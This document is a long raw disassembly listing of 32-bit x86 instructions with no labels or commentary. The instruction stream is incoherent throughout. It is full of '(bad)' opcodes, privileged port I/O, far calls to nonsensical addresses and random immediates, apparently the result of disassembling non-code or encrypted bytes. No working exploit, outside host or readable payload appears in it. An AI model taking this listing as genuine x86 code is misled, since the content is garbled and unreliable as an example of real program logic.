  427d10:	test   DWORD PTR ds:0xb2a61f45,ecx
  427d16:	pop    ds
  427d17:	nop
  427d18:	jno    0x427d7b
  427d1a:	imul   ebx,DWORD PTR [ebx+0x3c],0x3b
  427d1e:	push   0x6b
  427d20:	out    0x47,al
  427d22:	pop    ebx
  427d23:	inc    esp
  427d24:	adc    al,0xad
  427d26:	adc    cl,dl
  427d28:	inc    ecx
  427d29:	xor    ecx,DWORD PTR [eax-0x3fef4635]
  427d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d30:	lea    eax,[edi]
  427d32:	mov    edx,0xd9212022
  427d37:	add    bl,cl
  427d39:	mov    edi,0x951f3ed4
  427d3e:	adc    esp,DWORD PTR [eax+0x91a600]
  427d44:	pop    ebp
  427d45:	mul    DWORD PTR [eax-0x28925e9d]
  427d4b:	(bad)  fs:[eax]
  427d4e:	retf   
  427d4f:	nop
  427d50:	pop    ebx
  427d51:	xchg   edi,eax
  427d52:	fimul  DWORD PTR ss:[esi]
  427d55:	sti    
  427d56:	sub    eax,0x517b9e50
  427d5b:	cwde   
  427d5c:	(bad)  
  427d5d:	fsubr  st,st(5)
  427d5f:	push   esi
  427d60:	add    edx,DWORD PTR [esp+ebx*4]
  427d63:	xlat   BYTE PTR ds:[ebx]
  427d64:	push   edx
  427d65:	mov    edi,0xe22a3ef1
  427d6a:	mov    dh,0xb5
  427d6c:	ins    BYTE PTR es:[edi],dx
  427d6d:	mov    eax,ds:0x9b08785c
  427d72:	hlt    
  427d73:	mov    ds:0x866d004d,al
  427d78:	lock fdiv DWORD PTR [esi]
  427d7b:	pop    ds
  427d7c:	cwde   
  427d7d:	bound  eax,QWORD PTR [edi]
  427d7f:	add    eax,0xdcafd19b
  427d84:	outs   dx,BYTE PTR ds:[esi]
  427d85:	or     BYTE PTR [edi-0x25],dh
  427d88:	adc    DWORD PTR [ebp-0x3686c875],esi
  427d8e:	dec    edx
  427d8f:	jmp    0x418d2e4c
  427d94:	fild   DWORD PTR [edx-0x7e]
  427d97:	mov    esp,0x1b41b2e6
  427d9c:	call   0x39a394b4
  427da1:	das    
  427da2:	mov    al,ds:0x95748be4
  427da7:	xlat   BYTE PTR ds:[ebx]
  427da8:	ins    DWORD PTR es:[edi],dx
  427da9:	fistp  DWORD PTR [edx+0xf9b391a]
  427daf:	out    0xfb,al
  427db1:	sub    DWORD PTR [eax],ebx
  427db3:	pop    edi
  427db4:	mov    ch,0x83
  427db6:	mov    edx,0xd44ad5b5
  427dbb:	push   ebx
  427dbc:	lea    esi,[esi+0x6c5c0801]
  427dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427dc3:	pop    ebp
  427dc4:	lods   al,BYTE PTR ds:[esi]
  427dc5:	mov    esp,0xba860526
  427dca:	jne    0x427e39
  427dcc:	inc    ebx
  427dcd:	inc    esp
  427dce:	fsub   QWORD PTR [esi]
  427dd0:	xor    ebx,DWORD PTR [eax+0x46]
  427dd3:	jnp    0x427e2b
  427dd5:	pop    edi
  427dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dd7:	add    BYTE PTR [esi],ch
  427dd9:	mov    ah,0x2d
  427ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ddc:	addr16 push eax
  427dde:	and    eax,0x825ad648
  427de3:	mov    dh,0x20
  427de5:	push   eax
  427de6:	jg     0x427dd5
  427de8:	mov    edi,?
  427dea:	pop    ss
  427deb:	mov    dh,0xb
  427ded:	fcmovnb st,st(6)
  427def:	push   0x8d380c42
  427df4:	add    edx,esi
  427df6:	jo     0x427e0c
  427df8:	or     DWORD PTR [ebp+0x72208685],ecx
  427dfe:	imul   esp,edx,0x38
  427e01:	jle    0x427dc5
  427e03:	mov    dh,0xb5
  427e05:	stos   BYTE PTR es:[edi],al
  427e06:	sbb    eax,esp
  427e08:	jge    0x427e3e
  427e0a:	inc    esp
  427e0b:	xchg   ecx,eax
  427e0c:	pop    eax
  427e0d:	mov    es,WORD PTR [edx]
  427e0f:	outs   dx,BYTE PTR ds:[esi]
  427e10:	fstp   TBYTE PTR [ebx]
  427e12:	inc    ecx
  427e13:	shl    ebp,1
  427e15:	cs xchg edi,eax
  427e17:	shl    DWORD PTR [eax-0xc495f4b],1
  427e1d:	xor    cl,BYTE PTR [edi]
  427e1f:	pop    ebx
  427e20:	push   cs
  427e21:	jno    0x427e8e
  427e23:	jmp    0x427e47
  427e25:	mov    edx,0x84ee1b25
  427e2a:	adc    BYTE PTR [ebx+0x37],ch
  427e2d:	popf   
  427e2e:	or     dl,BYTE PTR [esi+0x4f6c75aa]
  427e34:	or     dh,dl
  427e36:	cmp    DWORD PTR [esi-0x56452493],esi
  427e3c:	aad    0xe6
  427e3e:	ds xchg ebp,eax
  427e40:	xchg   ebp,eax
  427e41:	cmc    
  427e42:	or     al,BYTE PTR [edi+0x2e]
  427e45:	in     eax,dx
  427e46:	mov    BYTE PTR [ebx],0x37
  427e49:	pusha  
  427e4a:	or     DWORD PTR [edi-0x1d3cbf6a],0xffffffea
  427e51:	bound  esi,QWORD PTR [esi-0x27fe5caa]
  427e57:	pushf  
  427e58:	sti    
  427e59:	sbb    dl,BYTE PTR [esi]
  427e5b:	popa   
  427e5c:	imul   edi,DWORD PTR [ebx+0x78c38702],0x26
  427e63:	mov    esp,edi
  427e65:	push   ebp
  427e66:	rol    BYTE PTR [ecx],1
  427e68:	shl    DWORD PTR [esi-0x5],0xc7
  427e6c:	inc    esp
  427e6d:	xchg   ebp,eax
  427e6e:	icebp  
  427e6f:	sahf   
  427e70:	fstp   TBYTE PTR [edx+0x455b5a39]
  427e76:	enter  0xccaa,0x8b
  427e7a:	cmp    dh,BYTE PTR [esi+0x6d1b8aed]
  427e80:	pop    ebp
  427e81:	pop    DWORD PTR [edx+0x57]
  427e84:	dec    eax
  427e85:	lock dec esp
  427e87:	in     eax,dx
  427e88:	mov    ?,WORD PTR [eax-0x79debf2b]
  427e8e:	call   0xdf1b:0xad20ae5a
  427e95:	test   DWORD PTR [esi],ebx
  427e97:	aaa    
  427e98:	in     al,dx
  427e99:	mov    dl,cl
  427e9b:	and    ebx,esi
  427e9d:	inc    esp
  427e9e:	xchg   ebx,eax
  427e9f:	dec    edi
  427ea0:	mov    dh,0x45
  427ea2:	mov    ch,0xb
  427ea4:	mov    esi,0xb71ac982
  427ea9:	mov    dl,0x62
  427eab:	(bad)  [esi+0x14]
  427eae:	mov    bh,0x71
  427eb0:	jecxz  0x427e9d
  427eb2:	sub    al,0x9
  427eb4:	in     eax,0xa7
  427eb6:	pushf  
  427eb7:	inc    edi
  427eb8:	arpl   bx,bx
  427eba:	call   0xf702:0xbd659360
  427ec1:	in     al,dx
  427ec2:	xlat   BYTE PTR ds:[ebx]
  427ec3:	cmp    al,0xb6
  427ec5:	test   DWORD PTR [ebp+0x40b7de70],ebp
  427ecb:	or     DWORD PTR [esi-0x48],0x12
  427ecf:	out    dx,eax
  427ed0:	add    al,BYTE PTR [ebp+0x29ad8dc6]
  427ed6:	and    eax,0x39baed84
  427edb:	xchg   ecx,eax
  427edc:	ins    DWORD PTR es:[edi],dx
  427edd:	xchg   edi,eax
  427ede:	mov    dh,0xad
  427ee0:	aas    
  427ee1:	or     eax,0x4d495631
  427ee6:	jns    0x427f0e
  427ee8:	push   cs
  427ee9:	sbb    eax,0x44d6d2d
  427eee:	jl     0x427f54
  427ef0:	or     ecx,esi
  427ef2:	sbb    dl,BYTE PTR [ecx-0x7e]
  427ef5:	add    eax,0xcace2d6e
  427efa:	add    al,0x30
  427efc:	out    0x9f,eax
  427efe:	push   edx
  427eff:	sub    eax,0xc80615b0
  427f04:	arpl   WORD PTR [esi+0x4b],si
  427f07:	or     ebp,eax
  427f09:	mov    ds:0x3238bb60,al
  427f0e:	jo     0x427f42
  427f10:	mov    al,ds:0x182e30f0
  427f15:	or     dh,BYTE PTR [edi]
  427f17:	imul   eax,DWORD PTR [edi+0x4589141],0xffffffbb
  427f1e:	mov    ds:0x3ad8dda,al
  427f23:	jne    0x427f11
  427f25:	ret    0xc60f
  427f28:	daa    
  427f29:	xor    eax,0x4435b162
  427f2e:	pop    ss
  427f2f:	lods   al,BYTE PTR ds:[esi]
  427f30:	mov    cl,0x73
  427f32:	inc    esi
  427f33:	sub    al,0xf8
  427f35:	xchg   ecx,eax
  427f36:	push   0xfa16b76b
  427f3b:	(bad)  
  427f3c:	imul   BYTE PTR [ecx+0xe]
  427f3f:	cmp    BYTE PTR [edi-0x7d],0xb6
  427f43:	mov    ebp,eax
  427f45:	and    eax,0x4df5cd64
  427f4a:	ret    0xdaa4
  427f4d:	ins    DWORD PTR es:[edi],dx
  427f4e:	mov    eax,ds:0x393df171
  427f53:	cli    
  427f54:	push   esp
  427f55:	fwait
  427f56:	sub    al,0x88
  427f58:	into   
  427f59:	add    al,0x5c
  427f5b:	fcom   DWORD PTR [esi+0x54d7cf83]
  427f61:	mov    ebx,0xa0db0418
  427f66:	xor    DWORD PTR [esi+0x7d],0x8502545d
  427f6d:	dec    ebp
  427f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f6f:	mov    DWORD PTR [edx-0x5b9695db],esp
  427f75:	inc    esp
  427f76:	mov    ah,0x85
  427f78:	pop    es
  427f79:	popa   
  427f7a:	mov    ds:0x34033add,eax
  427f7f:	(bad)  
  427f81:	call   0x34e5bed0
  427f86:	sbb    ebx,ebx
  427f88:	lods   eax,DWORD PTR ds:[esi]
  427f89:	ins    DWORD PTR es:[edi],dx
  427f8a:	ja     0x427f8e
  427f8c:	jecxz  0x427fc2
  427f8e:	out    dx,eax
  427f8f:	jnp    0x427fae
  427f91:	jp     0x427f26
  427f93:	rol    ah,0x16
  427f96:	or     ebx,DWORD PTR [ebx]
  427f98:	add    edx,0x40fab1f
  427f9e:	mov    ch,0xed
  427fa0:	(bad)  
  427fa1:	add    eax,0x323822f4
  427fa6:	mov    cl,0xb
  427fa8:	sbb    esi,DWORD PTR [ecx+0x6c]
  427fab:	test   DWORD PTR [esi-0x5917a650],esi
  427fb1:	jle    0x427f42
  427fb3:	xchg   ebx,eax
  427fb4:	inc    edi
  427fb5:	dec    edx
  427fb6:	or     bl,dl
  427fb8:	ss push eax
  427fba:	cs inc esi
  427fbc:	(bad)  
  427fbd:	adc    ebp,DWORD PTR gs:[ebp+ebp*4+0x6b]
  427fc2:	imul   ecx,DWORD PTR [eax],0x75
  427fc5:	lods   eax,DWORD PTR ds:[esi]
  427fc6:	cld    
  427fc7:	jg     0x428041
  427fc9:	das    
  427fca:	pop    ss
  427fcb:	aam    0xb7
  427fcd:	call   0xae5f:0xfd462e22
  427fd4:	mov    DWORD PTR [eax-0x6e],0xdc2b7565
  427fdb:	push   0xffffff95
  427fdd:	mov    ebx,0xd1be1c8a
  427fe2:	aas    
  427fe3:	(bad)
  427fe6:	sbb    BYTE PTR ds:0x62f96a00,0x18
  427fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fee:	mov    dh,0xdb
  427ff0:	inc    esi
  427ff1:	inc    edi
  427ff2:	mov    ebx,0xc2dc2a16
  427ff7:	mov    dh,0x63
  427ff9:	pop    edi
  427ffa:	mov    WORD PTR [ecx+0x70],ss
  427ffd:	test   eax,0x4d78be29
  428002:	out    0x89,eax
  428004:	sti    
  428005:	push   ebp
  428006:	rcl    dh,0x57
  428009:	mov    bh,0x92
  42800b:	(bad)  
  42800d:	sub    al,BYTE PTR [ebp+0x56b6dc50]
  428013:	push   eax
  428014:	int    0x3e
  428016:	pop    eax
  428017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428018:	cmp    BYTE PTR [edx+ebp*2],ah
  42801b:	and    bl,dl
  42801d:	adc    eax,0x70263c83
  428022:	lea    ebp,[esi+0x1d]
  428025:	add    eax,0x7f29d9dd
  42802a:	hlt    
  42802b:	add    cl,BYTE PTR [edx+0x34]
  42802e:	or     DWORD PTR [esi-0x432497dd],esi
  428034:	popf   
  428035:	push   0xe56acf73
  42803a:	je     0x42803c
  42803c:	jo     0x428019
  42803e:	retf   0x6b02
  428041:	xchg   BYTE PTR fs:[eax+0x2c0b6c70],bl
  428048:	je     0x42800f
  42804a:	daa    
  42804b:	call   0x6a2f:0xd4b90095
  428052:	xchg   edi,eax
  428053:	xchg   edi,eax
  428054:	outs   dx,BYTE PTR ds:[esi]
  428055:	cmp    si,cx
  428058:	mov    DWORD PTR [eax-0xb04ed00],eax
  42805e:	inc    edi
  42805f:	imul   ebp,DWORD PTR [ebx],0x5c
  428062:	pop    edx
  428063:	push   cs
  428064:	jb     0x42804f
  428066:	in     al,dx
  428067:	in     al,0x88
  428069:	add    dh,cl
  42806b:	out    dx,al
  42806c:	in     eax,dx
  42806d:	(bad)  
  42806e:	push   esi
  42806f:	jle    0x428041
  428071:	loop   0x428073
  428073:	xlat   BYTE PTR ds:[ebx]
  428074:	adc    BYTE PTR [esi+ebp*8],0x2a
  428078:	bound  esi,QWORD PTR [edx-0x14]
  42807b:	mov    al,0x2b
  42807d:	xor    BYTE PTR [esi-0x5ecf3aff],0xbe
  428084:	pop    eax
  428085:	mov    dh,0xd1
  428087:	(bad)  
  428088:	add    al,ch
  42808a:	retf   
  42808b:	pop    ecx
  42808c:	cmp    BYTE PTR [ecx-0x49c86d06],ch
  428092:	push   es
  428093:	loop   0x42809a
  428095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428096:	mov    edx,0xde1bd862
  42809c:	les    esi,FWORD PTR [esi+0x44]
  42809f:	mov    al,0x6d
  4280a1:	sahf   
  4280a2:	inc    edi
  4280a3:	pop    edi
  4280a4:	pop    ds
  4280a5:	xor    ebp,DWORD PTR [ecx+0x50ba8b1b]
  4280ab:	ficomp DWORD PTR [edx]
  4280ad:	or     edi,DWORD PTR [esi]
  4280af:	pop    ds
  4280b0:	cmc    
  4280b1:	pop    esp
  4280b2:	push   DWORD PTR [eax+ecx*1-0xd07494a]
  4280b9:	mov    esp,0x8511448f
  4280be:	and    ch,BYTE PTR es:[esi-0x19]
  4280c2:	leave  
  4280c3:	imul   edx,DWORD PTR [edx],0x82d17f58
  4280c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280ca:	test   DWORD PTR [ecx-0x72],edx
  4280cd:	jecxz  0x42806d
  4280cf:	mov    al,0x88
  4280d1:	ins    BYTE PTR es:[edi],dx
  4280d2:	adc    al,0xdb
  4280d4:	mov    dh,0x99
  4280d6:	fwait
  4280d7:	imul   edi,DWORD PTR [edx-0x359d5717],0xffffffe8
  4280de:	stos   BYTE PTR es:[edi],al
  4280df:	or     eax,0x3c3c7640
  4280e4:	push   edx
  4280e5:	into   
  4280e6:	outs   dx,BYTE PTR ds:[esi]
  4280e7:	mov    ch,0x68
  4280e9:	(bad)  
  4280eb:	stos   BYTE PTR es:[edi],al
  4280ec:	inc    esp
  4280ed:	stos   DWORD PTR es:[edi],eax
  4280ee:	mov    eax,ds:0x3608c631
  4280f3:	lds    esp,FWORD PTR [esi]
  4280f5:	and    dh,ah
  4280f7:	push   edi
  4280f8:	cwde   
  4280f9:	push   edx
  4280fa:	push   cs
  4280fb:	fdiv   DWORD PTR [esi-0x2b2912e5]
  428101:	mov    ecx,0x3ca4237f
  428106:	call   0x88933438
  42810b:	pop    ebx
  42810c:	pop    ebx
  42810d:	fldenv [ebp+esi*2-0x1eaa25bf]
  428114:	xor    eax,0x2ea836d0
  428119:	sbb    ebx,esp
  42811b:	jecxz  0x428198
  42811d:	adc    DWORD PTR [edx-0xb4b44a5],esp
  428123:	ss dec ebp
  428125:	in     eax,dx
  428126:	inc    ebp
  428127:	bound  ebx,QWORD PTR [ebx-0x5277ee64]
  42812d:	ins    BYTE PTR es:[edi],dx
  42812e:	fwait
  42812f:	adc    al,0x54
  428131:	icebp  
  428132:	xlat   BYTE PTR ds:[ebx]
  428133:	pop    ecx
  428134:	je     0x42815b
  428136:	mov    BYTE PTR [esi-0x137a725e],al
  42813c:	adc    DWORD PTR [ecx+eiz*2],ebx
  42813f:	pop    ebx
  428140:	mov    edx,0xd4dc715
  428145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428146:	jno    0x4280cd
  428148:	lods   eax,DWORD PTR ds:[esi]
  428149:	sar    DWORD PTR ds:0x6d8a86c2,1
  42814f:	xor    edi,DWORD PTR [edx-0x45]
  428152:	xchg   esi,eax
  428153:	or     bl,dl
  428155:	xor    DWORD PTR [ebp+0x2d],ebp
  428158:	push   0x35f49ba1
  42815d:	push   eax
  42815e:	jge    0x42811b
  428160:	add    al,bl
  428162:	cs push esi
  428164:	sahf   
  428165:	(bad)  
  428166:	xor    ah,cl
  428168:	push   ecx
  428169:	xlat   BYTE PTR ds:[ebx]
  42816a:	jg     0x428176
  42816c:	push   ecx
  42816d:	push   edi
  42816e:	adc    BYTE PTR [ebx],dh
  428170:	outs   dx,DWORD PTR ds:[esi]
  428171:	mov    esi,0xd882d6ed
  428176:	repnz pusha 
  428178:	aas    
  428179:	inc    esp
  42817a:	retf   
  42817b:	(bad)  
  42817d:	fcomp  DWORD PTR [edx]
  42817f:	mov    ch,BYTE PTR [esi-0x4a]
  428182:	test   eax,0x503d1ddf
  428187:	hlt    
  428188:	je     0x428133
  42818a:	sub    eax,0x6e43ccdd
  42818f:	cwde   
  428190:	jns    0x42818a
  428192:	jge    0x4281b1
  428194:	pushf  
  428195:	mov    cl,0xd1
  428197:	ss add ah,dl
  42819a:	clc    
  42819b:	mov    ds:0xb5b7b59,al
  4281a0:	xor    al,0x40
  4281a2:	sbb    edi,DWORD PTR [eax]
  4281a4:	mov    ds:0xb3abdbb9,al
  4281a9:	add    DWORD PTR [ebp+0x3654002d],esi
  4281af:	xor    bl,BYTE PTR [edx-0x24a4b4a5]
  4281b5:	pusha  
  4281b6:	jg     0x4281a8
  4281b8:	push   ebx
  4281b9:	mov    esp,0x71898c8
  4281be:	push   ecx
  4281bf:	add    eax,0xc275a974
  4281c4:	push   ebx
  4281c5:	into   
  4281c6:	push   eax
  4281c7:	sti    
  4281c8:	in     al,0x8b
  4281ca:	test   ebp,ecx
  4281cc:	aad    0xbf
  4281ce:	dec    esi
  4281cf:	std    
  4281d0:	cwde   
  4281d1:	push   0xffffffe8
  4281d3:	ins    BYTE PTR es:[edi],dx
  4281d4:	and    ecx,0x556096d6
  4281da:	push   0x5e533eab
  4281df:	sbb    DWORD PTR [ebp-0x4a],ebp
  4281e2:	xchg   esi,eax
  4281e3:	dec    edx
  4281e4:	push   ecx
  4281e5:	jmp    0xd306a3af
  4281ea:	push   esi
  4281eb:	mov    cl,0x15
  4281ed:	sub    BYTE PTR [ebp-0x4abd44d4],dh
  4281f3:	test   DWORD PTR [eax-0x48a6aa53],eax
  4281f9:	mov    bh,0xf8
  4281fb:	ins    BYTE PTR es:[edi],dx
  4281fc:	fild   DWORD PTR [ebp+0x4b1f8412]
  428202:	pusha  
  428203:	adc    DWORD PTR [edx-0x74],edi
  428206:	inc    edx
  428207:	stos   BYTE PTR es:[edi],al
  428208:	mov    eax,0x53ae55d0
  42820d:	add    DWORD PTR [esi+0x6b70ad25],ecx
  428213:	fwait
  428214:	dec    edi
  428215:	mov    WORD PTR [edx-0x6f83737d],ss
  42821b:	sub    ebp,DWORD PTR [eax-0x4b]
  42821e:	sub    eax,0x5b9e8500
  428223:	sbb    ebx,esp
  428225:	xchg   ebp,eax
  428226:	sbb    bl,0x57
  428229:	mov    bh,0x6
  42822b:	imul   ecx,ebx,0x7e
  42822e:	ret    0xf7f2
  428231:	push   ebx
  428232:	dec    edi
  428233:	or     BYTE PTR [esi+0x6dd44b88],0xa9
  42823a:	xor    DWORD PTR [ebp+ebx*8-0x3f27d718],ebp
  428241:	das    
  428242:	in     al,0x1c
  428244:	imul   ecx,DWORD PTR [ebx],0xda51bb3c
  42824a:	inc    esp
  42824b:	xchg   ecx,eax
  42824c:	lods   eax,DWORD PTR ds:[esi]
  42824d:	aas    
  42824e:	inc    esp
  42824f:	in     eax,0x45
  428251:	pop    ss
  428252:	or     dh,dl
  428254:	stos   BYTE PTR es:[edi],al
  428255:	or     ebx,DWORD PTR [ebx+0x2c]
  428258:	lock or bh,BYTE PTR [edx+eiz*2+0x162bec4f]
  428260:	ss retf 0x7e1b
  428264:	loopne 0x42828e
  428266:	fisttp QWORD PTR [ecx]
  428268:	mov    cl,0xed
  42826a:	add    BYTE PTR [eax-0x1],ah
  42826d:	xchg   BYTE PTR [eax],dl
  42826f:	mov    edx,0x36144c20
  428274:	add    al,0xb1
  428276:	dec    eax
  428277:	jmp    0x4282cd
  428279:	retf   0xaf4e
  42827c:	fld    TBYTE PTR [eax+0x2a]
  42827f:	outs   dx,BYTE PTR ds:[esi]
  428280:	stos   DWORD PTR es:[edi],eax
  428281:	cmp    BYTE PTR [ecx-0x7e],ch
  428284:	sbb    edx,DWORD PTR [edx]
  428286:	mov    cl,0x3e
  428288:	push   eax
  428289:	jno    0x42820c
  42828b:	ins    DWORD PTR es:[edi],dx
  42828c:	mov    DWORD PTR [esi-0x6d9e9cd5],0x756db6c0
  428296:	pusha  
  428297:	jo     0x4282fa
  428299:	xor    al,0x35
  42829b:	cmc    
  42829c:	pop    esp
  42829d:	sub    ebx,DWORD PTR [ebx-0x57]
  4282a0:	xor    BYTE PTR [ecx+0x6ddf1acc],dh
  4282a6:	sub    ecx,eax
  4282a8:	dec    ebx
  4282a9:	or     ebp,DWORD PTR [ebx+ebx*1-0x3a]
  4282ad:	xchg   esi,eax
  4282ae:	into   
  4282af:	adc    al,0xba
  4282b1:	call   0xe5db:0x685a362c
  4282b8:	lock add ah,ah
  4282bb:	(bad)  
  4282bc:	xchg   ebp,eax
  4282bd:	cmp    esp,edx
  4282bf:	inc    esp
  4282c0:	popf   
  4282c1:	aam    0xec
  4282c3:	mov    bl,BYTE PTR [edi]
  4282c5:	pop    esp
  4282c6:	aam    0x31
  4282c8:	out    0x83,al
  4282ca:	je     0x4282cb
  4282cc:	cdq    
  4282cd:	out    dx,eax
  4282ce:	xchg   edi,eax
  4282cf:	pop    edx
  4282d0:	adc    eax,0xd56e445d
  4282d5:	test   BYTE PTR [edi+edx*4-0x4a],ch
  4282d9:	xchg   esi,eax
  4282da:	sbb    eax,0x1aaea00c
  4282df:	mov    edx,0xedd5085e
  4282e4:	sbb    BYTE PTR ds:0xb1889e50,0xd
  4282eb:	push   0xffffff91
  4282ed:	mov    ds:0xa7b041d5,al
  4282f2:	xor    BYTE PTR [esi],ch
  4282f4:	pop    edx
  4282f5:	inc    eax
  4282f6:	fld    TBYTE PTR [ebp-0x58d97a3]
  4282fc:	jo     0x428316
  4282fe:	int    0xc8
  428300:	or     esi,DWORD PTR [ecx]
  428302:	cs jp  0x428307
  428305:	mov    dh,0xbc
  428307:	pop    ebp
  428308:	push   0xffffffbc
  42830a:	es ror ebp,cl
  42830d:	and    BYTE PTR [ebp-0xa431100],dl
  428313:	ins    BYTE PTR es:[edi],dx
  428314:	adc    ebx,ebx
  428316:	ret    0xfac4
  428319:	pop    edi
  42831a:	ds mov esp,0x6e88edf4
  428320:	dec    ebp
  428321:	inc    ebp
  428322:	out    dx,eax
  428323:	lock ret 0xddb0
  428327:	lods   eax,DWORD PTR ds:[esi]
  428328:	cli    
  428329:	stos   BYTE PTR es:[edi],al
  42832a:	pusha  
  42832b:	dec    esp
  42832c:	dec    ebx
  42832d:	sti    
  42832e:	shl    ch,1
  428330:	les    ebp,FWORD PTR [esi]
  428332:	mov    eax,0x1a2acb6d
  428337:	fdivr  QWORD PTR [edi+ebx*8+0x32976bda]
  42833e:	aad    0x45
  428340:	pop    ecx
  428341:	ins    BYTE PTR es:[edi],dx
  428342:	xchg   ebx,eax
  428343:	sub    eax,0xa265d317
  428348:	push   ebp
  428349:	cmp    al,0xf7
  42834b:	cmp    DWORD PTR [edx+ebx*1],ebx
  42834e:	mov    bh,0x6d
  428350:	jae    0x428341
  428352:	and    ecx,DWORD PTR [edx+ebx*1+0x64]
  428356:	fwait
  428357:	ins    BYTE PTR es:[edi],dx
  428358:	mov    es,WORD PTR [ebx]
  42835a:	fadd   DWORD PTR [ecx+esi*2-0x25]
  42835e:	push   esi
  42835f:	inc    esi
  428360:	xlat   BYTE PTR ds:[ebx]
  428361:	fs xchg ecx,eax
  428363:	rol    DWORD PTR [ebx+ebx*2+0x17],1
  428367:	sbb    ah,BYTE PTR ss:[edx]
  42836a:	test   DWORD PTR [ebx-0x3a],0x49a22e8f
  428371:	jbe    0x42834e
  428373:	pop    eax
  428374:	push   0xe7a1ca44
  428379:	lods   eax,DWORD PTR ds:[esi]
  42837a:	lds    edx,FWORD PTR [ebp+0x5dbce37]
  428380:	ror    BYTE PTR [ebp-0x5409d8d6],0x8d
  428387:	add    DWORD PTR [edx+0x5d],esp
  42838a:	fdivr  DWORD PTR [edx]
  42838c:	(bad)  
  42838d:	(bad)  
  42838e:	sub    DWORD PTR [eax+0xf1912fb],esp
  428394:	cmp    DWORD PTR [ebp+0x63],ebp
  428397:	or     edi,DWORD PTR [edx]
  428399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42839a:	xchg   BYTE PTR [edi],dh
  42839c:	add    BYTE PTR [edi-0x5ae5f562],ah
  4283a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a3:	fiadd  WORD PTR [edi+0x71]
  4283a6:	frstor [eax]
  4283a8:	add    DWORD PTR [ebp+0x17],ebp
  4283ab:	call   0x6ece:0xa30abcdd
  4283b2:	fcmovu st,st(4)
  4283b4:	sub    al,BYTE PTR [ecx+0x75]
  4283b7:	stos   BYTE PTR es:[edi],al
  4283b8:	icebp  
  4283b9:	mov    ebp,ecx
  4283bb:	dec    edx
  4283bc:	call   0x59df:0x36002e
  4283c3:	and    BYTE PTR [ebx+eiz*2],0x81
  4283c7:	jo     0x42838a
  4283c9:	mov    al,ds:0x1f79975c
  4283ce:	and    eax,edx
  4283d0:	inc    esp
  4283d1:	mov    ebp,DWORD PTR [eax-0x66]
  4283d4:	aad    0x64
  4283d6:	enter  0x8026,0x76
  4283da:	add    eax,eax
  4283dc:	mov    esp,0xdf80fcbc
  4283e1:	ret    0x6ac2
  4283e4:	sbb    DWORD PTR [ebx+eiz*8],0x24170491
  4283eb:	jmp    0x428412
  4283ed:	mov    al,ds:0x1a58a9b6
  4283f2:	and    al,0xef
  4283f4:	ret    
  4283f5:	jo     0x428422
  4283f7:	add    BYTE PTR [ebx+0x7d],cl
  4283fa:	cs in  al,0x8c
  4283fd:	loop   0x42843a
  4283ff:	mov    dh,0x76
  428401:	popa   
  428402:	test   eax,0x7c54110a
  428407:	and    BYTE PTR [esp+edx*8+0x5f],dh
  42840b:	sub    al,ah
  42840d:	inc    esi
  42840e:	pop    ebx
  42840f:	mov    esp,DWORD PTR [ebp-0x38]
  428412:	and    BYTE PTR [eax],ch
  428414:	add    al,0xf3
  428416:	adc    eax,0x7aaec45d
  42841b:	cli    
  42841c:	mov    al,0x1c
  42841e:	mov    BYTE PTR [edx-0x25],ah
  428421:	add    BYTE PTR [esi+ebx*1+0x57],ch
  428425:	out    0x11,eax
  428427:	and    DWORD PTR [ebp+0x1c],0x46
  42842b:	mov    ds:0x482b826a,eax
  428430:	xchg   edi,eax
  428431:	pop    edx
  428432:	shl    BYTE PTR [edi-0x5a4e12f5],1
  428438:	adc    DWORD PTR [ebp+0x62],0xffffffbf
  42843c:	retf   
  42843d:	out    0x3a,al
  42843f:	and    DWORD PTR [edx+0x620c476d],ecx
  428445:	popa   
  428446:	mov    eax,ds:0xd003415d
  42844b:	ins    DWORD PTR es:[edi],dx
  42844c:	test   eax,0x4485aae7
  428451:	dec    edx
  428452:	add    DWORD PTR [ebx+0x695b1b0b],ebx
  428458:	lea    edi,[eax-0x2]
  42845b:	xor    eax,0xd1606f1
  428460:	fs mov dh,0x9
  428463:	and    BYTE PTR [ebp+0x2bdb7168],0xe9
  42846a:	mov    dh,BYTE PTR ds:0xb6942a06
  428470:	xchg   edx,eax
  428471:	pop    eax
  428472:	pop    edi
  428473:	fidiv  WORD PTR [ebx-0x5a522498]
  428479:	jge    0x428401
  42847b:	int3   
  42847c:	popa   
  42847d:	(bad)  
  42847e:	xor    BYTE PTR [ecx-0x527a0d9d],cl
  428484:	fstp   st(2)
  428486:	ret    
  428487:	cmp    eax,0xb479c67
  42848c:	cmp    esp,DWORD PTR [edx-0x397a2ff0]
  428492:	test   esi,ecx
  428494:	push   ss
  428495:	in     al,dx
  428496:	inc    ecx
  428497:	adc    eax,0xcf1ecf91
  42849c:	test   DWORD PTR [ebp-0x495bc71f],ebp
  4284a2:	aam    0xc4
  4284a4:	jg     0x42849d
  4284a6:	xor    eax,DWORD PTR [edx+0x1b5b6e20]
  4284ac:	jb     0x428511
  4284ae:	xchg   ecx,eax
  4284af:	cmc    
  4284b0:	push   eax
  4284b1:	je     0x4284bd
  4284b3:	fstp   TBYTE PTR [esi+0x74]
  4284b6:	imul   ebp,DWORD PTR [edi-0x30e537f0],0xffffff82
  4284bd:	or     dl,BYTE PTR [ecx+esi*2-0x8]
  4284c1:	out    dx,eax
  4284c2:	(bad)  [edx-0x488cbd40]
  4284c8:	fmul   DWORD PTR [edi-0x68]
  4284cb:	push   eax
  4284cc:	xor    BYTE PTR [ebx-0x36e44bc0],ch
  4284d2:	jg     0x4284ef
  4284d4:	sub    al,0xbb
  4284d6:	pop    ebx
  4284d7:	mov    ch,0xd5
  4284d9:	adc    al,0x70
  4284db:	jp     0x42846b
  4284dd:	imul   DWORD PTR [eax]
  4284df:	(bad)  
  4284e0:	jmp    0x4284cd
  4284e2:	and    ah,al
  4284e4:	mov    dh,0x43
